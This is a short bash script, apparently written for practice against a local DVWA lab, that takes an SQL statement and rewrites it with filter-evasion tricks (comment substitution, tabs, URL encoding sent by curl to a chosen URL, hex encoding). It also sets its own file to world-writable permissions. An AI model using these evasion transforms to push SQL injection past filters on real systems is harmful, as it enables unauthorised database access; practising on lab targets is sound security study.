#!/bin/bash

function permissionSet()
{
	chmod 777 script.sh
}
#Setting permission of file in function then calling function to ensure the program can run with proper permissions
permissionSet

#Take input from user
echo -e "Enter SQL Statement"
read sql

echo "Which evasion technique would you like to apply?"
echo -e "1) Comment technique. 2) Whitespace technique. 3) URL Encoding Technique. 4 Hex Encoding Technique"
read number

case $number in
	1)
	#Comment techniques, e.g. SELECT/**/ID/**/FROM/**/USERS. Done.
	echo "$sql" | awk '{ gsub (" ", "/**/", $0); print}'


	;;

	2)
	#Whitespacing technique, tab spacing
	echo "$sql" | sed 's/ /\t/g'
	;;

	3)
	#URL Encoding, active url to test: http://127.0.0.1/dvwa/vulnerabilities/sqli/ 
	echo -e "Enter URL You Want To Encode:"
	read url
	curl -G -v "$url" --data-urlencode "=$sql" #URL and UTF-8 encoding
	;;

	4)
	#Hex Encoding
	echo "Hex Encode Result:"
	hex=$(echo "$sql" | xxd -p)
	echo "$hex"
	echo "$hex" | xxd -r -p

	;;

	*)
	echo -n "wrong input"
	;;
esac

#Input feedback for user to review
echo "input is $sql"






